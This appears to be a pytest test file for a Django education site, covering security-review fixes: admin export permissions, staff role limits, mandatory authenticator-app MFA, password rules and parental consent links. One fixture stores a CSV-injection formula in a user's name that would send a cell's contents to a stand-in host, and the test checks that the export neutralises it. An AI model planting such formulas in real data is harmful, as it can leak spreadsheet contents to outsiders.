"""Security review fixes for accounts and staff (SECURITY_REVIEW.md): exports, roles, MFA, parental consent,
passwords."""

import re
import time
from datetime import date
from io import StringIO

import pytest
from allauth.account.models import EmailAddress
from allauth.mfa.totp.internal.auth import TOTP, format_hotp_value, generate_totp_secret, hotp_value
from django.contrib import admin
from django.contrib.admin.models import LogEntry
from django.contrib.auth.password_validation import validate_password
from django.core import mail
from django.core.exceptions import PermissionDenied, ValidationError
from django.core.management import call_command
from django.test import Client
from django.urls import reverse
from import_export.formats.base_formats import CSV
from pwned_passwords_django import api as pwned_passwords

from accounts import roles
from accounts.factories import PASSWORD, UserFactory
from accounts.models import STAFF_SESSION, ConsentRecord, User
from accounts.test_roles import member
from accounts.tests import birthday
from content.models import Board
from content.tests import make_paper
from practice.models import Attempt

pytestmark = pytest.mark.django_db


def test_only_the_admin_role_exports_and_each_export_is_logged(rf):  # M5, L7
    call_command("bootstrap_roles", stdout=StringIO())
    UserFactory(full_name='=HYPERLINK("https://x.example/?"&B2,"Open")', date_of_birth=date(2010, 5, 14))
    request = rf.get("/admin/accounts/user/export/")
    request.user = member(roles.SUPPORT, roles.SALES, is_staff=True)
    for model in (User, ConsentRecord, Attempt):
        assert not admin.site._registry[model].has_export_permission(request), model
    with pytest.raises(PermissionDenied):
        admin.site._registry[User].get_export_data(CSV(), request, User.objects.all())
    request.user = member(roles.ADMIN, is_staff=True)
    for model in (User, ConsentRecord, Attempt):
        assert admin.site._registry[model].has_export_permission(request), model
    csv = admin.site._registry[User].get_export_data(CSV(), request, User.objects.all())
    assert "date_of_birth" not in csv and "2010-05-14" not in csv and "parent_contact" not in csv
    assert '"HYPERLINK(' in csv and "=HYPERLINK" not in csv  # no formula for the spreadsheet
    entry = LogEntry.objects.get()
    assert (entry.user, entry.object_repr) == (request.user, "Export of 3 users")


def test_periodic_tasks_and_who_may_do_what_are_left_to_superusers(client):  # I7
    call_command("bootstrap_roles", stdout=StringIO())
    manager = member(roles.ADMIN, is_staff=True)
    assert manager.has_perms(["accounts.change_user", "django_celery_beat.view_periodictask", "auth.view_group"])
    for perm in [
        "django_celery_beat.change_periodictask",
        "django_celery_beat.add_periodictask",
        "django_celery_results.delete_taskresult",
        "auth.change_group",
        "auth.change_permission",
    ]:
        assert not manager.has_perm(perm), perm
    client.force_login(manager)
    page = client.get(reverse("admin:accounts_user_change", args=[UserFactory().pk]))
    assert page.status_code == 200 and 'name="is_superuser"' not in page.text and 'name="groups"' not in page.text
    superuser = UserFactory(is_staff=True, is_superuser=True)
    assert client.get(reverse("admin:auth_user_password_change", args=[superuser.pk])).status_code == 403


def test_staff_must_set_up_an_authenticator_app_before_anything_else(client):  # H2
    staff = UserFactory(is_staff=True, is_superuser=True, totp=False)
    client.force_login(staff)
    for url in [reverse("admin:index"), reverse("account")]:
        response = client.get(url)
        assert (response.status_code, response["Location"]) == (302, reverse("mfa_activate_totp")), url
    response = client.get("/api/v1/me/")  # the API answers in JSON
    assert (response.status_code, response.json()["code"]) == (403, "mfa_setup_required")
    client.post(reverse("account_reauthenticate"), {"password": PASSWORD})  # the set-up asks for the password again
    page = client.get(reverse("mfa_activate_totp"))
    assert page.status_code == 200 and 'src="data:image/svg+xml;base64,' in page.text  # the QR code (segno)
    assert client.get("/static/css/site.css").status_code != 302  # static files are not held back
    TOTP.activate(staff, generate_totp_secret())
    assert client.get(reverse("admin:index")).status_code == 200
    client.force_login(UserFactory())  # students are not asked
    assert client.get(reverse("account")).status_code == 200


def test_the_admin_login_is_allauths_with_the_code_and_staff_sessions_last_8_hours(client, settings):  # H2
    settings.MFA_TOTP_TOLERANCE = 1  # a code of the previous or next 30 seconds too: no failure at a boundary
    staff, secret = UserFactory(is_staff=True, totp=False), generate_totp_secret()
    EmailAddress.objects.create(user=staff, email=staff.email, verified=True, primary=True)
    TOTP.activate(staff, secret)
    response = client.get(reverse("admin:login"), {"next": "/admin/"})
    assert response["Location"] == reverse("account_login") + "?next=%2Fadmin%2F"
    response = client.post(reverse("account_login"), {"login": staff.email, "password": PASSWORD, "next": "/admin/"})
    assert response["Location"] == reverse("mfa_authenticate")  # the password alone is not enough
    assert "_auth_user_id" not in client.session
    code = format_hotp_value(hotp_value(secret, int(time.time()) // 30))
    response = client.post(reverse("mfa_authenticate"), {"code": code})
    assert response["Location"] == "/admin/" and client.get("/admin/").status_code == 200
    assert STAFF_SESSION.total_seconds() - 60 < client.session.get_expiry_age() <= STAFF_SESSION.total_seconds()


def test_passwords_need_10_characters_and_no_breach_and_reset_links_last_an_hour(settings, monkeypatch):  # L11
    assert settings.PASSWORD_RESET_TIMEOUT == 3600
    breached = "Kaziranga-2028"
    monkeypatch.setattr(pwned_passwords.default_client, "check_password", lambda password: 3 * (password == breached))
    for password, error in [("Assam-27x", "at least 10 characters"), (breached, "too common")]:
        with pytest.raises(ValidationError, match=error):
            validate_password(password)
    validate_password("Brahmaputra-2027")


def sign_up(client, **fields):
    data = {
        **{"full_name": "Rahul Das", "email": "rahul@example.com", "password1": PASSWORD, "password2": PASSWORD},
        **{"class_level": 12, "board": Board.objects.get().pk, "date_of_birth": birthday(16).isoformat()},
        **{"parent_name": "Anita Das", "consent": "on", **fields},
    }
    return client.post(reverse("account_signup"), data)


def parent_link(to):
    [body] = [m.body for m in mail.outbox if m.to == [to]][-1:]
    return re.search(r"/c/[^/\s]+/", body).group()


def confirm_own_address(client, email="rahul@example.com"):
    """The code emailed to the student at the sign-up, typed where the website asks for it (the parent's link goes
    only after this: SECURITY_REVIEW_PHASE5_6.md M3)."""
    [body] = [m.body for m in mail.outbox if m.to == [email]][-1:]
    code = re.search(r"^(\d{6})$", body, re.M).group(1)
    return client.post(reverse("account_email_verification_sent"), {"code": code})


def test_verified_mode_marks_wait_for_the_parents_emailed_consent(client, settings, monkeypatch):  # M9
    settings.PARENTAL_CONSENT_MODE = "verified"
    paper = make_paper()
    assert (
        "parent_contact" in sign_up(client, parent_contact="+44 20 7946 0958").context["form"].errors
    )  # no link to a landline or a number abroad (SMS to an Indian mobile: accounts/test_parent_sms.py)
    sign_up(client, parent_contact="Anita@Example.com")
    user = User.objects.get()
    assert user.consent_pending and ConsentRecord.objects.get().method == ConsentRecord.Method.DECLARED
    assert not [m for m in mail.outbox if m.to == ["anita@example.com"]]  # not before the student's own address
    confirm_own_address(client)
    first_link = parent_link("anita@example.com")
    client.force_login(user)
    response = client.post(reverse("attempt_add", args=[paper.code]), {"date": "2026-10-01", "marks_obtained": "40"})
    assert "has not confirmed your account yet" in response.text and not Attempt.objects.exists()
    assert "Waiting for your parent" in client.get(reverse("account")).text
    client.post(reverse("parent_consent_resend"), {"parent_contact": "rahul@example.com"})  # not the student's own
    client.post(reverse("parent_consent_resend"), {"parent_contact": "father@example.com"})  # a corrected address
    parent, link = Client(), parent_link("father@example.com")
    assert parent.get(first_link).status_code == 400  # the old address's link no longer works
    later = time.time() + 8 * 86400
    with monkeypatch.context() as m:
        m.setattr(time, "time", lambda: later)
        assert parent.get(link).status_code == 400  # 7 days
    page = parent.get(link)
    assert (
        "Rahul Das" in page.text
        and "I agree" in page.text
        and not ConsentRecord.objects.filter(by_parent=True, verified_at__isnull=False).exists()
    )
    assert "account is confirmed" in parent.post(link).text
    record = ConsentRecord.objects.get(method=ConsentRecord.Method.EMAIL_LINK)
    assert record.by_parent and record.verified_at and not User.objects.get().consent_pending
    response = client.post(reverse("attempt_add", args=[paper.code]), {"date": "2026-10-01", "marks_obtained": "40"})
    assert response.status_code == 302 and Attempt.objects.exists()
